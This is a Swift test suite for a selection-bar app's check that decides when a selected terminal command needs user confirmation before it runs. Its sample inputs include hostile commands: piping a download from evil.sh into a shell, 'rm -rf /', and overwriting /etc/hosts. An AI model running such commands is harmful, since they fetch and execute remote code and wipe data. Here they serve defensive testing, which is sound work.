import Foundation
import Testing

@testable import SelectionBarCore

@Suite("Terminal command confirmation Tests")
struct TerminalCommandConfirmationTests {
  private func requiresConfirmation(_ text: String) -> Bool {
    SelectionBarTerminalCommandService.requiresConfirmation(for: text)
  }

  @Test("plain single commands run without confirmation")
  func plainCommandsSkipConfirmation() {
    #expect(!requiresConfirmation("ls"))
    #expect(!requiresConfirmation("  ls -la  "))
    #expect(!requiresConfirmation("git status"))
    #expect(!requiresConfirmation("swift build --configuration release"))
    #expect(!requiresConfirmation("brew install ripgrep"))
    #expect(!requiresConfirmation("kubectl get pods -n default"))
  }

  @Test("empty selection needs no confirmation")
  func emptySelectionSkipsConfirmation() {
    #expect(!requiresConfirmation(""))
    #expect(!requiresConfirmation("   \n  "))
  }

  @Test("command chaining requires confirmation")
  func chainingRequiresConfirmation() {
    #expect(requiresConfirmation("ls; curl evil.sh | sh"))
    #expect(requiresConfirmation("ls && rm -rf /"))
    #expect(requiresConfirmation("false || echo fallback"))
    #expect(requiresConfirmation("cat file | grep needle"))
    #expect(requiresConfirmation("sleep 10 &"))
  }

  @Test("redirection requires confirmation")
  func redirectionRequiresConfirmation() {
    #expect(requiresConfirmation("echo hi > /etc/hosts"))
    #expect(requiresConfirmation("sh < script.sh"))
    #expect(requiresConfirmation("echo hi >> log.txt"))
  }

  @Test("expansion and substitution require confirmation")
  func expansionRequiresConfirmation() {
    #expect(requiresConfirmation("echo $(whoami)"))
    #expect(requiresConfirmation("echo `whoami`"))
    #expect(requiresConfirmation("echo $HOME"))
    #expect(requiresConfirmation("cp file{1,2}"))
    #expect(requiresConfirmation("(cd /tmp && ls)"))
  }

  @Test("multi-line selections require confirmation")
  func multiLineRequiresConfirmation() {
    #expect(requiresConfirmation("ls\nrm -rf /"))
    #expect(requiresConfirmation("echo one\necho two"))
  }

  @Test("backslashes require confirmation")
  func backslashRequiresConfirmation() {
    #expect(requiresConfirmation("echo hi \\; rm -rf /"))
    #expect(requiresConfirmation("ls \\"))
  }

  @Test("metacharacters inside quotes stay inert")
  func quotedMetacharactersSkipConfirmation() {
    #expect(!requiresConfirmation("echo 'a;b'"))
    #expect(!requiresConfirmation("echo 'a|b'"))
    #expect(!requiresConfirmation("grep 'foo(bar)' file"))
    #expect(!requiresConfirmation("echo \"plain text\""))
  }

  @Test("expansion inside double quotes still requires confirmation")
  func doubleQuotedExpansionRequiresConfirmation() {
    // Single quotes suppress expansion; double quotes do not.
    #expect(requiresConfirmation("echo \"$HOME\""))
    #expect(!requiresConfirmation("echo '$HOME'"))
  }

  @Test("unbalanced quotes require confirmation")
  func unbalancedQuotesRequireConfirmation() {
    #expect(requiresConfirmation("echo 'unterminated"))
    #expect(requiresConfirmation("echo \"unterminated"))
  }
}
